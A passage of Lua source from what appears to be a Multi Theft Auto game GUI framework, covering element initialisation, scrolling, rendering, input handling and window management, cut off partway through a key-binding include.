						scrollBgColor = element.scrollBgColor or {27,32,54,255},
						scrollColor = element.scrollColor or {180,70,70,255},
						color = table.copy(element.textColor or {255,255,255,255}),

						scollWidth = 5,
						scrollXOffset = -22,
						scrollHeight = 0.8,

						animationAlpha = element.select_animData,

						parent = element,

						listElements = element.selectElements or {},
						listElementHeight = lHeight,

						font = element.font,
						scale = element.scale,

						alignX = element.alignX or 'left',
						textPadding = (element.alignX or 'left') == 'center' and 0 or 20,

						additionalElementDrawing = element.additionalElementDrawing,

						onListElementClick = function(element, lElement, index)

							local _, target = getAnimData(element.animationAlpha)
							if target == 0 then
								element.lastSelectedItem = false
								element.selectedItem = false
								return
							end

							element.parent.selectedItem = lElement
							if element.parent.onSelect then
								element.parent.onSelect(element.parent, lElement)
							end

							activeSelect = nil
							animate(element.animationAlpha, 0)
						end,
					}

				)


				for index, item in pairs( element.selectElements ) do
					if item.selected then
						element.selectedItem = element.selectElements[index]
					end
				end

			end

	
		end,

		clickbox = function(element)

			element.select = function(element, index)

				element.values = element.values or {}
				element.selected = index
				element[6] = (element.values[element.selected] or {}).text or ''

				element:callHandler('onChange', element.values[element.selected], element.selected)

			end

			if element.initSelect ~= false then
				element:select(element.selected or 1)
			end

		end,

		slider = function(element, elementId, section)

			if not (element.cancelSlide or element.slide == false) then

				element:addHandler('onScroll', function(element, side)

					local total = element.range[2] - element.range[1]
					local add = total*(side == 'down' and 1 or -1)*0.05

					element.value = math.clamp( element.value + add, unpack(element.range) )

					element:callHandler('onSlide', element.value)

				end)

				element.onDragDrop = function(element, x,y)

					local ex,ey,ew,eh = getElementAbsoluteOffset(element)

					local hx,hy = x,y
					if element.mtaDraw then
						hx,hy = px(x), px(y)
					end

					local progress = hx/ew

					local min,max = unpack(element.range or {0,1})
					local value = min + (max - min)*progress

					element.value = value

					element:callHandler('onSlide', value, progress)

				end

				element.onClick = function(element, pos)

					local x,y,w,h = getElementAbsoluteOffset(element)

					local hx,hy

					-- if element.mtaDraw then
						hx,hy = pos[1], pos[2]
					-- else
					-- 	hx,hy = pos[1] * sx/real_sx, pos[2] * sx/real_sx
					-- end

					local progress = hx/w

					local min,max = unpack(element.range or {0,1})
					local value = min + (max - min)*progress

					element.value = value

					if element.onSlide then
						element.onSlide(element, value, progress)
					end


				end
			end
	
		end,

		textarea = function(element, elementId, section)

			element.fontHeight = dxGetFontHeight(element.scale, element.font)

			element.maxRowWidth = element[4] - (element.padding or 0)*2

			element.render_text = ''
			element._ontextareainput = function(element, text)

				if not text then

					element.render_text = utf8.sub(element.render_text, 0, -2)

					local lastSymbol = utf8.sub(element.render_text, -1)
					if lastSymbol == '\n' then
						element.render_text = utf8.sub(element.render_text, 0, -2)
					end

				else

					for _, symbol in pairs( string.split(text, '') ) do

						local splitted = splitString(element.render_text, '\n')

						local curRow = splitted[#splitted]
						local str = curRow .. symbol

						local width = dxGetTextWidth(str, element.scale, element.font)

						if math.abs(width - element.maxRowWidth) < 10 then
							element.render_text = element.render_text .. '\n' .. symbol
						else
							element.render_text = element.render_text .. symbol
						end 

					end

				end

			end

		end,

		input = function(element)

			element.blur = function(element)

				if not element.focused then return end

				element.focused = false
				selectedInput = false

			end

			element.focus = function(element)

				focusInput(element)

			end

		end,

	}

	function createElementVerticalOverflow(element)

		element.ov_animId = {}
		setAnimData(element.ov_animId, element.scroll_speed or 0.1, 0)

		element.update_endY = function(element)

			local endY = element[5]

			for _, c_element in pairs( element.elements or {} ) do

				local _endY = c_element[3] + c_element[5]
				if _endY > endY then
					endY = _endY
				end

			end

			-- endY = endY - element[5]
			element.ov_endY = endY

		end

		element.update_scroll_tex = function(element)

			if element.ov_endY == 0 then return end

			local scroll_height = element[5]*(element.scrollHeight or 0.8)
			local scroll_height_a = math.max(1, scroll_height * element[5]/(element.ov_endY))

			if scroll_height_a ~= element.scroll_height_a then

				element.scroll_height = scroll_height
				element.scroll_height_a = scroll_height_a

				local w = element.scrollWidth or 7

				element.scroll_bg = whiteTexture
				element.scroll_abg = whiteTexture

				-- element.scroll_bg = createTextureSource( 'bordered_rectangle', 'voscroll.png', w, w, element.scroll_height )
				-- element.scroll_abg = createTextureSource( 'bordered_rectangle', 'voscroll_a.png', w, w, element.scroll_height_a )

			end

		end

		element:update_endY()
		element:update_scroll_tex()

		element:addHandler('onScroll', function(element, side)

			local scrollStep = element.scroll_step or 100

			element:update_endY()
			element:update_scroll_tex()

			local delta = side == 'up' and 1 or -1

			local _, _animY = getAnimData(element.ov_animId)

			local animY = math.clamp( _animY + delta*scrollStep, -(element.ov_endY-element[5]), 0 )

			animate(element.ov_animId, animY)

		end)

		element:addHandler('lOnPostRender', function(element)

			local x,y,w,h = element:abs()
			local alpha = element:alpha()

			-- print(getTickCount(  ), element.ov_endY)
			if element.ov_endY > element[5] then
			-- if element.ov_endY > element[5] then

				local scx,scy,scw,sch = x+w+(element.scrollXOffset or -20), y+h/2 - element.scroll_height/2, element.scrollWidth or 7, element.scroll_height

				local r,g,b = unpack(element.scrollBgColor or {45,50,90})
				local ar,ag,ab = unpack(element.scrollColor or {180,70,70})

				dxDrawImage(
					scx,scy,scw,sch, element.scroll_bg,
					0, 0, 0, tocolor(r,g,b,255*alpha)
				)

				local animY = getAnimData(element.ov_animId)

				local progress = -( animY / ( element.ov_endY - element[5] ) )

				local sch_a = element.scroll_height_a
				local py = ( sch - sch_a )*progress

				dxDrawImage(
					scx,scy+py,scw,sch_a, element.scroll_abg,
					0, 0, 0, tocolor(ar,ag,ab,255*alpha)
				)

			end

			element:update_endY()
			element:update_scroll_tex()

		end)

	end

	function createElementHorizontalOverflow(element)

		element.ov_animId = {}
		setAnimData(element.ov_animId, element.scroll_speed or 0.1, 0)

		element.update_endX = function(element)

			local endX = element[4]

			for _, c_element in pairs( element.elements or {} ) do

				local _endX = c_element[2] + c_element[4]
				if _endX > endX then
					endX = _endX
				end

			end

			endX = endX - element[4]
			element.ov_endX = endX

		end

		element:update_endX()

		element:addHandler('onScroll', function(element, side)

			local scrollStep = element.scroll_step or 100

			element:update_endX()

			local delta = side == 'up' and 1 or -1

			local _, _animX = getAnimData(element.ov_animId)

			local animX = math.clamp( _animX + delta*scrollStep, -element.ov_endX, 0 )

			animate(element.ov_animId, animX)

		end)

	end

	local guiModuleLoaded = false

	GUIDefine_data = {}

	function GUIDefine(element_type, data)
		GUIDefine_data[ element_type ] = data
	end

	elements_links = {}

	function initializeElement( sectionName, elementId, element )

		if element.define_from ~= false and GUIDefine_data[ element.define_from or element[1] ] then

			for key, value in pairs( GUIDefine_data[ element.define_from or element[1] ] ) do
				if element[key] == nil then
					element[key] = value
				end
			end

		end

		if element.variable then
			_G[element.variable] = element
		end

		if element.id then
			elements_links[sectionName] = elements_links[sectionName] or {}
			elements_links[sectionName][element.id] = element
		end

		if not element.startcolor then
			if element.color then
				element.startcolor = element.color[4]
			else
				element.startcolor = 255
			end
		end

		element.animData = 0

		element.abs = function(self, ...)
			return getElementAbsoluteOffset(self, ...)
		end

		element.alpha = function(self)
			return getElementAbsoluteAlpha(self)
			-- return getElementDrawAlpha(self)
		end

		if type(element[4]) == 'string' and element[4]:sub(-1) == ('%') then
			local percent = tonumber( element[4]:sub(0, -2) ) / 100
			if element.parent then
				element[4] = element.parent[4] * percent
			else
				element[4] = sx * percent
			end
		elseif type(element[4]) == 'function' then
			element[4] = (element[4])(element, element.parent or { 'root', 0, 0, sx,sy })
		end

		if type(element[5]) == 'string' and element[5]:sub(-1) == ('%') then
			local percent = tonumber( element[5]:sub(0, -2) ) / 100
			if element.parent then
				element[5] = element.parent[5] * percent
			else
				element[5] = sy * percent
			end
		elseif type(element[5]) == 'function' then
			element[5] = (element[5])(element, element.parent or { 'root', 0, 0, sx,sy })
		end

		if element[2] == 'center' then
			if element.parent then
				element[2] = element.parent[4]/2 - element[4]/2
			else
				element[2] = sx/2 - element[4]/2
			end
		elseif element[2] == 'right' then
			if element.parent then
				element[2] = element.parent[4] - element[4]
			else
				element[2] = sx - element[4]
			end
		elseif element[2] == 'left' then
			element[2] = 0
		elseif type(element[2]) == 'function' then
			element[2] = (element[2])(element, element.parent or { 'root', 0, 0, sx,sy })
		end

		if element[3] == 'center' then
			if element.parent then
				element[3] = element.parent[5]/2 - element[5]/2
			else
				element[3] = sy/2 - element[5]/2
			end
		elseif element[3] == 'bottom' then
			if element.parent then
				element[3] = element.parent[5] - element[5]
			else
				element[3] = sx - element[5]
			end
		elseif element[3] == 'top' then
			element[3] = 0
		elseif type(element[3]) == 'function' then
			element[3] = (element[3])(element, element.parent or { 'root', 0, 0, sx,sy })
		end


		if not element.__data then
			element.__data = {
				id = elementId,
				section = sectionName,
				__alpha0 = (element.color or {255,255,255,255})[4] or 255,
			}
		end

		if not element.destroy then

			element.destroy = function( element )

				element:callHandler('onDestroy')

				for _, c_element in pairs(element.elements or {}) do
					c_element:destroy()
				end

				if element[1] == 'select' then
					element.selectList:destroy()
				end

				if element.parent then
					if element.parent.elements then
						element.parent.elements[ element.__data.id ] = nil
					end
				else
					windowModel[ element.__data.section ][ element.__data.id ] = nil
				end

				element:callHandler('onPostDestroy')

			end

		end

		if not element.addElement then

			element.addElement = function( element, __table, index )

				local _table = table.copy(__table)

				_table.parent = element

				element.elements = element.elements or {}

				if index then
					table.insert(element.elements, index, _table)
				else
					table.insert(element.elements, _table)
				end

				for index, c_element in pairs( element.elements ) do

					if c_element == _table then
						return initializeElement( element.__data.section, index, c_element )
					end

					if c_element.__data then
						c_element.__data.id = index
					end

				end

				return _table

			end

		end

		if not element.addHandler then

			element.addHandler = function( element, handler_name, func, order )

				local handlers = element[handler_name] or {}

				if type(handlers) == 'function' then
					handlers = { element[handler_name] }
				end

				if order then
					table.insert( handlers, order, func )
				else
					table.insert( handlers, func )
				end

				element[handler_name] = handlers

			end

			element.callHandler = function( element, handler_name, ... )

				local handler = element[handler_name]
				if not handler then return end

				if type(handler) == 'function' then

					handler(element, ...)

				elseif type(handler) == 'table' then

					for _, _handler in pairs(handler) do
						_handler(element, ...)
					end

				end

			end

		end

		if not element.__init  then

			if initializeFunctions[element[1]] then

				( initializeFunctions[element[1]] )( element, elementId, sectionName )

			end

			element:callHandler('onInit')

			element.__init = true

		end


		for index, child in pairs( element.elements or {} ) do
			child.parent = element
			initializeElement( sectionName, index, child )
		end

		if element.overflow == 'vertical' then
			createElementVerticalOverflow(element)
		elseif element.overflow == 'horizontal' then
			createElementHorizontalOverflow(element)
		end

		element:callHandler('onPostInit')

		local animId = element
		element.animId = element
		setAnimData(element.animId, 0.1, 0)

		return element

	end

	function initializeSection( sectionName, section )

		for elementId, element in pairs(section) do
			initializeElement( sectionName, elementId, element )
		end

	end

	function loadGuiModule()

		if not guiModuleLoaded then
			setAnimData('dxGui.window-alpha', windowAnimSpeed or 0.1)
		end

		if windowModel.__basic and not guiModuleLoaded then

			for sectionName, section in pairs(windowModel) do

				if not __basic_Ignore[sectionName] and sectionName ~= '__basic' then
					for index, element in pairs( table.reverse(windowModel.__basic) ) do
						table.insert(section, 1, element)
					end				
				end

			end

		end

		for sectionName, section in pairs(windowModel) do
			initializeSection( sectionName, section )
		end


		if not guiModuleLoaded then

			if openHandler then
				table.insert( openHandlers, openHandler )
			end

			if closeHandler then
				table.insert( closeHandlers, closeHandler )
			end

			setTimer(function()
				animate('input-blim', inputBlim and 1 or 0)
				inputBlim = not inputBlim
			end, 600, 0)
			
		end

		guiModuleLoaded = true

	end

-----UTILS-------------------------------------------------------

	function getElementDrawAlpha(element)
		return element.color[4]*windowAlpha/(element.__data.__alpha0 or 255)
	end

	function getGUIElementsByType(element_type)

		local elements = {}

		for _, element in pairs( windowModel[currentWindowSection] ) do

			if element[1] == element_type then
				table.insert(elements, element)
			end

			local _elements = element.elements

			while _elements do
				for _, _element in pairs( _elements ) do
					if _element[1] == element_type then
						table.insert(elements, _element)
					end
					_elements = _element.elements
				end
			end

		end

		return elements

	end

	function getListAverageElementHeight(list)

		local height = 0
		local dHeight = list.listElementHeight or 35

		if #list.listElements == 0 then
			return dHeight
		end

		for _, element in pairs(list.listElements) do
			height = height + ( element.height or dHeight )
		end

		return height / #(list.listElements)
	end

	function clearAllInputs()
		for _, section in pairs(windowModel) do
			for index, element in pairs(section) do
				if (element[1] == 'input') or (element[1] == 'textarea') then element[6] = '' end
			end
		end
	end

	function focusInput(element)
		if selectedInput then
			selectedInput.focused = false
		end

		element.focused = true

		selectedInput = element

		element:callHandler('onFocus')

		guiSetInputMode("no_binds")

	end

	function gui_get(id, section)
		if not elements_links[section or currentWindowSection] then return end
		return elements_links[section or currentWindowSection][id]
	end

	function deleteElementById(id)

		local env = _element and (_element.elements or {}) or windowModel[currentWindowSection]

		for index, element in pairs(env) do
			if id == element.id then
				element:destroy()
			end
		end
	end

	function animate_timed(animData, time, to_1, to_2)
		if isTimer(animate_timed_timer) then killTimer(animate_timed_timer) end
		animate(animData, to_1)
		animate_timed_timer = setTimer(function(animData, to)
			animate(animData, to)
		end, time, 1, animData, to_2)
	end

	function deleteCurInputSymbol()
		if not selectedInput then return end
		if not currentWindowSection then return end
		local element = selectedInput
		if element then
			local prev = element[6]
			element[6] = utf8.sub(element[6], 0, utf8.len(element[6]) - 1)

			if element._ontextareainput then
				element._ontextareainput(element)
			end

			if element.onInput then
				element.onInput(element, false, prev)
			end

		end
	end

	function scrollList(element, offset)
		activeList = element
		scrollActiveList(offset)
		activeList = false
	end

	function scrollActiveList(eOffset)

		local element = activeList

		if element then
			local _offset = (element.listOffset or 0) + eOffset * (element.scrollStep or 1) 

			element.listOffset = math.clamp(_offset, -#element.listElements + element[5]/( getListAverageElementHeight(element) ), 0)

		end

	end



-----WINDOW OPEN-------------------------------------------------------

	function toggleWindowOpened()
		
		windowOpened = not windowOpened

		if windowOpened then

			showCursor(true)

			if openHandlers then
				for _, handler in pairs( openHandlers ) do
					handler(handleResourceStop, unpack(currentWindowArgs or {}))
				end
			end

			if not windowRender then
				addEventHandler('onClientRender', root, drawWindow, true, windowPriority or 'low-2')
				windowRender = true
			end
			addEventHandler('onClientClick', root, onClick) 
			addEventHandler('onClientCursorMove', root, onCursorMove)
			addEventHandler('onClientCharacter', root, onCharacter)
			addEventHandler('onClientKey', root, onKey)
			addEventHandler('onClientPaste', root, onPaste)

			addCurrentWindow()

			animate('dxGui.window-alpha', 1)

			-- if refreshWindowSources_query then
			-- 	refreshWindowSources()
			-- 	refreshWindowSources_query = false
			-- end

		else

			showCursor(false)
			dragDropFlag = false

			if closeHandlers then
				for _, handler in pairs( closeHandlers ) do
					handler(handleResourceStop)
				end
			end

			removeCurrentWindow()

			animate('dxGui.window-alpha', 0)

			removeEventHandler('onClientClick', root, onClick) 
			removeEventHandler('onClientCursorMove', root, onCursorMove)
			removeEventHandler('onClientCharacter', root, onCharacter)
			removeEventHandler('onClientKey', root, onKey)
			removeEventHandler('onClientPaste', root, onPaste)

		end

		selectedInput = false
		guiSetInputMode("allow_binds")

	end

	function setWindowOpened(state)
		if state then
			if not windowOpened then
				toggleWindowOpened()
			end
		else
			if windowOpened then
				toggleWindowOpened()
			end
		end
	end

	addEventHandler('onClientResourceStop', resourceRoot, function()
		if windowOpened then
			handleResourceStop = true
			setWindowOpened(false)
			destroyAllDrawingTextures()
			removeCurrentWindow()
		end
	end)

-----RENDER-------------------------------------------------------

	function getElementAbsoluteOffset(element, ignore_o)

		local x,y,w,h = element[2], element[3], element[4], element[5]

		if element.parent and element.parent.overflow == 'vertical' then
			y = y + (element.parent.y_offset or 0)

			if not ignore_o then
				return x,y,w,h
			end

		elseif element.parent and element.parent.overflow == 'horizontal' then

			x = x + (element.parent.x_offset or 0)

			if not ignore_o then
				return x,y,w,h
			end

		end

		if not element.anim_fix and not disableVerticalAnim then
			y = y - 50*(1- (windowAlpha or 0) )
		end

		local _parent = element.parent
		while _parent do

			local _x,_y,_w,_h = _parent[2], _parent[3], _parent[4], _parent[5]
			x,y = x+_x,y+_y

			if _parent.parent and _parent.parent.overflow == 'vertical' then
				y = y + (_parent.parent.y_offset or 0)

				if not ignore_o then
					return x,y,w,h
				end

			elseif _parent.parent and _parent.parent.overflow == 'horizontal' then
				x = x + (_parent.parent.x_offset or 0)

				if not ignore_o then
					return x,y,w,h
				end
			end

			_parent = _parent.parent

		end

		return x,y,w,h

	end

	function getElementAbsoluteAlpha(element)

		local alpha = windowAlpha

		if element.animationAlpha then
			alpha = alpha * getAnimData(element.animationAlpha)
		end

		local _parent = element.parent
		while _parent do

			alpha = alpha * (_parent.color[4]/255)

			_parent = _parent.parent

		end

		return alpha

	end

	function pre_renderElement(k,v)

		local noDraw

		noDraw = v.noDraw or v.drawCondition
		if type(noDraw) == 'function' then
			noDraw = noDraw(v)
		end

		if not noDraw then

			local animAlpha = 1
			if v.animationAlpha then

				animAlpha = getEasingValue(
					getAnimData(v.animationAlpha),
					'InOutQuad'
				)

			end

			-- animAlpha = animAlpha * getElementAbsoluteAlpha(v)

			if not v.startcolor then
				if v.color then
					v.startcolor = v.color[4]
				else
					v.startcolor = 255
				end
			end

			v.color = v.color or {255,255,255,255}
			v.color[4] = v.startcolor * animAlpha


			if animAlpha > 0.05 and ( (v.color or ({[4]=255}))[4] > 1 or v.drawAnyway) then

				v:callHandler('gOnPreRender')

				for k,v in pairs(v.elements or {}) do
					pre_renderElement(k,v)
				end

			end
		end				

	end

	function renderElement(k,v)

		local noDraw, hovered,
			x1,y1,x2,y2

		noDraw = v.noDraw
		if type(noDraw) == 'function' then
			noDraw = noDraw(v)
		end

		x1,y1,x2,y2 = getElementAbsoluteOffset(v, true)

		if not noDraw then

			local animAlpha = getElementAbsoluteAlpha(v)
			if v.animationAlpha then

				animAlpha = animAlpha * getEasingValue(
					getAnimData(v.animationAlpha),
					'InOutQuad'
				)

			end
				
			if not v.startcolor then
				if v.color then
					v.startcolor = v.color[4]
				else
					v.startcolor = 255
				end
			end

			v.color = v.color or {255,255,255,255}
			v.color[4] = v.startcolor * animAlpha

			if animAlpha > 0.05 and ( (v.color or ({[4]=255}))[4] > 1 or v.drawAnyway) then

				v:callHandler('onPreRender')

				if v.onPostRender then
					if v.postRenderPriority then
						table.insert(postRender, { v, animAlpha, k })
					else
						table.insert(postRender, 1, { v, animAlpha, k })
					end
				end

				local animData = getAnimData(v)
				v.animData = getEasingValue(animData, 'InOutQuad')


				if drawFunctions[v[1]] then
					drawFunctions[v[1]](v, k)
				end

				if v.mtaDraw then
					hovered = mta_isMouseInPosition(x1,y1,x2,y2)
				else
					hovered = isMouseInPosition(x1,y1,x2,y2)
				end

				if hovered then

					local _, target = getAnimData(v.animId)
					if target ~= 1 then
						v:callHandler('onHover')
					end

					animate(v.animId, 1)

				else
					animate(v.animId, 0)
				end

				if hovered and not (v.noHandleHover or v.hover == false) then
					hasHoveredElement = hovered
				end
				
				v.hovered = hovered

				if hovered and v.onDragDrop and not activeDDElement then
					activeDDElement = v

					if v.onDragDropStart then
						v:onDragDropStart()
					end

				end

				if v[1] == 'list' and hovered then
					activeList = v
				end

				if v.onScroll and hovered and (v.scroll ~= false) then
					activeScrollElement = v
				end 

				v:callHandler('onRender')

				local currentSelectHover
				if activeSelect then

					local sx1,sy1,sx2,sy2 = activeSelect.selectList:abs()

					if activeSelect.mtaDraw then
						currentSelectHover = mta_isMouseInPosition(sx1,sy1,sx2,sy2)
					else
						currentSelectHover = isMouseInPosition(sx1,sy1,sx2,sy2)
					end
					

				end


				if handleClick and not currentSelectHover then
					

					inputFocused = false
					if v.onClick then

						if hovered then
							handleClick = false

							local args = { unpack(v.onClickArgs or {}) }
							table.insert(args, v)

							local posX, posY = getCursorPosition()

							posX = posX * (v.mtaDraw and real_sx or sx) - x1
							posY = posY * (v.mtaDraw and real_sy or sy) - y1

							table.insert(args, {posX, posY})
							table.insert(args, currentButtonHandle)
							local result = v.onClick( unpack(args) )

							if type(result) == 'table' and result.focusedInput then
								inputFocused = true
							end

						end

					elseif (v[1] == 'input' or v[1] == 'textarea') and not v.noEdit then

						local disabled = v.disabled
						if type(disabled) == 'function' then
							disabled = disabled()
						end
						if hovered and not disabled then
							handleClick = false
							selectedInput = v
							inputFocused = true

							v:callHandler('onFocus')

							guiSetInputMode("no_binds")
						end

					elseif v[1] == 'checkbox' then

						if hovered then

							v.checked = not v.checked
							v:callHandler('onCheck', v.checked)

						end 

					elseif v[1] == 'clickbox' then

						if hovered then

							v.selected = (v.selected or 1) + 1
							if v.selected > #(v.values or {}) then
								v.selected = 1
							end

							v:callHandler('onChange', v.values[v.selected], v.selected)

						end

					end
					if not inputFocused then

						if selectedInput then
							selectedInput:callHandler('onBlur')
						end

						selectedInput = false
					end

				end

				if v.overflow == 'vertical' then

					local width,height = x2,y2
					if not v.renderTarget then
						if not v.mtaDraw then
							width,height = px(width), px(height)
						end

						v.renderTarget = dxCreateRenderTarget(width, height, true)
					end

					dxSetBlendMode('modulate_add')
					dxSetRenderTarget(v.renderTarget, true)

					v.y_offset = getAnimData(v.ov_animId)

				elseif v.overflow == 'horizontal' then

					local width,height = x2,y2
					if not v.renderTarget then
						if not v.mtaDraw then
							width,height = px(width), px(height)
						end

						v.renderTarget = dxCreateRenderTarget(width, height, true)
					end

					dxSetBlendMode('modulate_add')
					dxSetRenderTarget(v.renderTarget, true)

					v.x_offset = getAnimData(v.ov_animId)

				end

				for k,_v in pairs(v.elements or {}) do

					if v.overflow == 'vertical' then

						local animY = getAnimData(v.ov_animId)

						if isBetween( _v[3]+animY, -_v[5], v[5] ) then
							renderElement(k,_v)
						end

					elseif v.overflow == 'horizontal' then

						local animX = getAnimData(v.ov_animId)

						if isBetween( _v[2]+animX, -_v[4], v[4] ) then
							renderElement(k,_v)
						end

					else

						renderElement(k,_v)
						
					end
				end

				if v.overflow then

					dxSetRenderTarget()
					dxSetBlendMode('blend')

					dxDrawImage(
						x1,y1,x2,y2, 
						v.renderTarget,
						0, 0, 0, tocolor(255,255,255,255*v:alpha())
					)

				end

				v:callHandler('lOnPostRender')


			end
		end

	end


	function drawWindow()

		if not currentWindowSection then return end
		if not windowModel[currentWindowSection] then return end

		local wAnim, wTarget = getAnimData('dxGui.window-alpha')

		windowAlpha = getEasingValue(wAnim, 'InOutQuad')
		if windowAlpha < 0.1 and wTarget == 0 then
			destroyAllDrawingTextures()
			
			if windowRender then
				removeEventHandler('onClientRender', root, drawWindow, true, 'low-2')
				windowRender = false
			end

			return 
		end

		if blurBackground then

			local texture = getBlurTexture(
				getScreenSource(), windowAlpha*6, windowAlpha
			)

			mta_dxDrawImage(
				0, 0, real_sx, real_sy,
				texture, 0, 0, 0,
				tocolor(255, 255, 255, 255*windowAlpha)
			)

		end

		if not hideBackground then
			mta_dxDrawRectangle(
				0, 0, real_sx, real_sy,
				tocolor(0, 0, 0, 220*windowAlpha)
			)
		end

		if windowPreRender then
			windowPreRender()
		end

		if not dragDropFlag then

			if activeDDElement and activeDDElement.onDragDropFinish then
				activeDDElement:onDragDropFinish()
			end

			activeDDElement = false

		end

		activeList = false
		activeScrollElement = false

		postRender = {}

		hasHoveredElement = false

		for k,v in pairs(windowModel[currentWindowSection]) do
			pre_renderElement(k,v)
		end

		for k,v in pairs(windowModel[currentWindowSection]) do
			renderElement(k,v)
		end


		for _, data in pairs(postRender) do
			data[1]:callHandler('onPostRender', unpack(data))
		end

		postRender = {}
		handleClick = false

	end

-----HANDLERS-------------------------------------------------------

	function onClick(button,state)

		if not windowOpened then return end
		if not isCurrentWindow() then return end

		if state == 'up' then
			dragDropFlag = false
			return
		end
		dragDropFlag = true

		guiSetInputMode("allow_binds")


		if activeSelect then

			local hoverFunc = activeSelect.mtaDraw and mta_isMouseInPosition or isMouseInPosition

			local x,y,w,h = activeSelect:abs()
			h =  h + activeSelect.selectList[5]

			if not hoverFunc(x,y,w,h) then
				animate(activeSelect.animData, 0)
				activeSelect = nil
			else
				drawFunctions.list(activeSelect.selectList, activeSelect.__data.id)
			end

		end

		currentButtonHandle = button

		-- exports.main_sounds:playSound('click')
		exports.main_sounds:playSound( 'checkbox' )
		handleClick = true


	end

	local prevMouseX, prevMouseY
	local slidePowerCoef = 1.5
	function onCursorMove(x,y)
		x,y = x * sx, y * sy

		if dragDropFlag then

			if activeDDElement then
				local posX, posY = getCursorPosition()

				local sw,sh

				if activeDDElement.mtaDraw then
					sw,sh = real_sx, real_sy
				else
					sw,sh = sx,sy
				end


				if not posX then return end

				local x,y,w,h = getElementAbsoluteOffset(activeDDElement)

				local h_posX, h_posY = posX * sw - x, posY * sh - y

				local n_posX = math.max( math.min( h_posX, activeDDElement[4] ), 0 )
				local n_posY = math.max( math.min( h_posY, activeDDElement[5] ), 0 )

				activeDDElement.onDragDrop(activeDDElement, n_posX, n_posY, posX, posY)
			end

		end
	end

	local pressed = {}

	setTimer(function()
		if not windowOpened then return end
		if pressed['backspace'] and pressed['backspace'][1] then
			if (getTickCount() - pressed['backspace'][2]) > 400 then
				deleteCurInputSymbol()
			end
		end
	end, 50, 0)

	function onCharacter(hKey)
		if not windowOpened then return end

		if not selectedInput then return end

		local element = selectedInput

		if element.type == 'number' then
			if not tonumber(hKey) then return end
		end

		if element.possibleSymbols then
			if not utf8.find( element.possibleSymbols, utf8.lower(hKey) ) then
				return
			end
		end

		if pressed['lshift'] and pressed['lshift'][1] then
			hKey = utf8.upper(hKey)
		end

		local max = element.maxSymbols or 30

		if not element.maxSymbols and element[1] == 'textarea' then
			max = 999999
		end

		if utf8.len(element[6]) < max then
			local prev = element[6]
			element[6] = element[6]..hKey

			element:callHandler('onInput', hKey, prev)

			if element._ontextareainput then
				element._ontextareainput(element, hKey)
			end

		end
	end

	function onPaste(data)
		if not windowOpened then return end

		if not selectedInput then return end

		local element = selectedInput

		if element.type == 'number' then

			for _, symbol in pairs( string.split(data) ) do
				if not tonumber(symbol) then return end
			end

		end

		if element.possibleSymbols then
			for _, symbol in pairs( string.split(data) ) do
				if not utf8.find( element.possibleSymbols, utf8.lower(symbol) ) then
					return
				end
			end
		end

		local max = element.maxSymbols or 30

		if not element.maxSymbols and element[1] == 'textarea' then
			max = 999999
		end

		if (utf8.len(element[6]) + utf8.len(data)) <= max then
			local prev = element[6]
			element[6] = element[6]..data

			if element.onInput then
				element.onInput(element, data, prev)
			end

			if element._ontextareainput then
				element._ontextareainput(element, data)
			end

		end

	end

	function element_onKey(element, key)

		local keyHandlers = element.onKey or {}
		local handlers = keyHandlers[key] or {}

		if type(handlers) == 'function' then
			handlers(element, hKey)
		elseif type(handlers) == 'table' then
			for _, handler in pairs( handlers ) do
				handler(element, hKey)
			end
		end

		for _, c_element in pairs( element.elements or {} ) do
			element_onKey( c_element, key )
		end

	end

	function onKey(key, state)
		if not windowOpened then return end

		if key == 'mouse_wheel_down' then
			if cancelScroll then return end
			if activeList then
				return scrollActiveList(-1)
			elseif activeScrollElement then
				activeScrollElement:callHandler('onScroll', 'down')
			end

			cancelEvent()
		elseif key == 'mouse_wheel_up' then
			if cancelScroll then return end
			if activeList then
				return scrollActiveList(1)
			elseif activeScrollElement then
				activeScrollElement:callHandler('onScroll', 'up')
			end

			cancelEvent()
		end

		if cancelButtons and cancelButtons[key:lower()] then
			cancelEvent()
		end

		pressed[key] = {state, getTickCount(  )}
		if not state then return end

		if key == 'backspace' then
			deleteCurInputSymbol()
		end

		if selectedInput then 

			for _, element in pairs( selectedInput.elements or {} ) do
				element_onKey(element, key)
			end

			if not (isBetween(#key, 2, 3) and key:lower():find('f')) then
				cancelEvent()
			end

		else
			for _, element in pairs( windowModel[currentWindowSection] or {} ) do
				element_onKey(element, key)
			end
		end

	end

-----MANAGER----------------------------------------------------------

	function isCurrentWindow()
		local windows_assoc = localPlayer:getData('__gui.windows') or {}

		local windows = {}

		for window, timestamp in pairs( windows_assoc ) do
			table.insert( windows, { window = window, timestamp = timestamp } )
		end

		table.sort(windows, function(a,b)
			return (tonumber(a.timestamp) or 0) > (tonumber(b.timestamp) or 0)
		end)

		return windows[1].window == getThisResource().name

	end

	function addCurrentWindow()
		local windows = localPlayer:getData('__gui.windows') or {}
		windows[ getThisResource().name ] = getTickCount()
		localPlayer:setData('__gui.windows', windows, false)
	end

	function removeCurrentWindow()
		local windows = localPlayer:getData('__gui.windows') or {}
		windows[ getThisResource().name ] = nil
		localPlayer:setData('__gui.windows', windows, false)
	end

---------------------------------------------------------------]===]
			includes['gui.key-dialog'] = [===[--gui.key-dialog
]===]
			includes['binds'] = [===[--binds

	local bindElements = {}

	function getCurrentBindKey()
		local data = bindElements[currentBindElement] or {}
		return data.key or 'f'
	end

	------------------------------------------------

	local curTooltipState
	local function setTooltipState(state)
		if curTooltipState == state then return end
		curTooltipState = state

		local data = bindElements[currentBindElement] or {}

		exports.hud_notify:actionNotify((data.key or ''):upper(), data.text or '',
			state and 'infinite' or 0)
	end

	setTooltipState(false)

	------------------------------------------------

	local function onKey(button, state)
		if button == getCurrentBindKey() and state then

			if currentBindElement and not isCursorShowing() then

				local data = bindElements[currentBindElement] or {}

				if data.func then
					data.func(currentBindElement)
				end

				setTooltipState(false)

				if isTimer(tooltipTimer) then killTimer(tooltipTimer) end

				tooltipTimer = setTimer(function()

					if not isCursorShowing() then
						if isElement(currentBindElement) then
							setTooltipState(true)
						end
						killTimer(tooltipTimer)
					end

				end, 100, 0)

				cancelEvent()

			end
			
		end
	end

	local function addHandlers()
		addEventHandler('onClientKey', root, onKey)
	end

	local function removeHandlers()
		removeEventHandler('onClientKey', root, onKey)
	end

	------------------------------------------------

	function callBindHandler(marker)
		currentBindElement = marker
		setTooltipState(true)
		addHandlers()
	end

	addEventHandler('onClientVehicleExit', root, function(player)
		if player == localPlayer and waitForExit then
			callBindHandler(waitForExit)
			waitForExit = nil
		end
	end)

	local function onHit(player)
		if (
